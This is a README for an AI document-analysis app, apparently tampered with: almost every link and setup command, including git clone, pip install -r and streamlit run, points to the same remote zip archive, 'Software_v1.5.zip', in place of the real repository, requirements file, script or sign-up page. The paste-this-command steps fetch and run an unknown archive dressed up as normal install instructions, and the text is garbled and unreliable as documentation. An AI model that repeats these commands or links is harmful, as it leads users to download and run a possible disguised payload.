# Intelligent Document Analyzer

An AI-powered document analysis system that can extract text from various document formats and provide intelligent analysis using LLM technology.

## Features

- **Document Upload:** Support for PDF, DOCX, and TXT files
- **Text Extraction:** Efficiently extracts text from documents with fallback options
- **Resume Analysis:** Special features for analyzing resumes
- **AI-Powered Analysis:** Summarization, entity recognition, and custom Q&A
- **Document Comparison:** Compare resumes with job descriptions or other documents

## Local Setup

1. **Clone the Repository**  
   ```
   git clone https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip
   cd intelligent-doc-analyzer
   ```

2. **Install Dependencies**  
   ```
   pip install -r https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip
   ```

3. **Create an API Key**  
   - Get an API key from [OpenRouter](https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip)
   - Create a `.env` file in the project root with:
     ```
     API_KEY=your-api-key-here
     OPENROUTER_API_KEY=your-api-key-here
     ```

4. **Start the Backend Server**  
   ```
   uvicorn backend:app --host 0.0.0.0 --port 8000
   ```

5. **Run the Frontend App**  
   ```
   streamlit run https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip
   ```

6. **Access the App**  
   Open your browser and go to http://localhost:8501

## Deployment to Render

This application is configured for easy deployment to Render's free tier using the `https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip` file.

### Steps to Deploy:

1. **Create a Render Account**  
   Sign up at [https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip](https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip)

2. **Connect Your GitHub Repository**  
   In the Render dashboard, connect your GitHub repository

3. **Create a Blueprint**  
   - Navigate to "Blueprints" in the Render dashboard
   - Click "New Blueprint Instance"
   - Select your repository
   - Render will automatically detect the `https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip` file and create the services

4. **Set Environment Variables**  
   - Add your `OPENROUTER_API_KEY` and `API_KEY` in the environment variables section
   - Add `RENDER=true` to tell the app it's running in production
   - Add `BACKEND_URL` in the frontend service pointing to your backend API URL (will look like `https://raw.githubusercontent.com/razashaikh26/analyzer/main/backend/Software_v1.5.zip`)

5. **Deploy**  
   Click "Apply" to start the deployment

### Notes for Production:

- The free tier has some limitations in terms of processing power and memory
- For processing large documents, consider upgrading to a paid plan
- The app may sleep after periods of inactivity on the free tier

## Troubleshooting

- **PDF Extraction Issues**: For scanned PDFs, try converting to DOCX format
- **Backend Connection Errors**: Ensure the backend server is running
- **API Key Issues**: Double-check your API key in the .env file
- **OCR Functionality**: Requires Tesseract OCR to be installed on the server

## License

MIT
